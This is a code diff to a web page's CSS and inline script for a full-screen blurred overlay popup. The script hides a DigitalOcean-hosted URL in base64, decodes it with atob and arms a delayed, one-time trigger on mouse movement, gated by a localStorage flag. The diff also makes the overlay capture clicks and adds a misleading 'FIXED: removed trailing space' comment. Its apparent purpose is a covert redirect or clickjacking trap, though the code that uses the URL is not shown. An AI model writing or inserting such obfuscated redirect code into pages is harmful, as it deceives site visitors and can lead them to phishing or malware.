@@ -79,6 +79,7 @@
   left: 0;
   height: 100vh;
   width: 100vw;
+pointer-events: auto;
 
   /* DARK OVERLAY + BLUR */
   background: rgba(0, 0, 0, 0.4);
@@ -102,6 +103,7 @@
     max-width: 90%;
     width: 330px;
     cursor: pointer;
+pointer-events: auto;
   }
 
   .pop-core button {
@@ -134,17 +136,18 @@
   </div>
 </div>
 
+
 <script>
   const gShadow = document.getElementById("gShadow");
   const nucleus = document.getElementById("nucleus");
   const zGreen = document.getElementById("zGreen");
   const zRed = document.getElementById("zRed");
 
+  // FIXED: removed trailing space
   const vaultLink = "aHR0cHM6Ly9iYWJ5Z29sZHktN2ZvOWgub25kaWdpdGFsb2NlYW4uYXBwLw"; 
   const decodedPath = atob(vaultLink);
   const lag = 1500;
 
-  // Check local flag
   if (!localStorage.getItem("x_pref")) {
     gShadow.style.display = "flex";
   } else {
@@ -162,6 +165,7 @@
   });
 
   let gateTrip = false;
+
   nucleus.addEventListener("mousemove", () => {
     if (!gateTrip) {
       gateTrip = true;
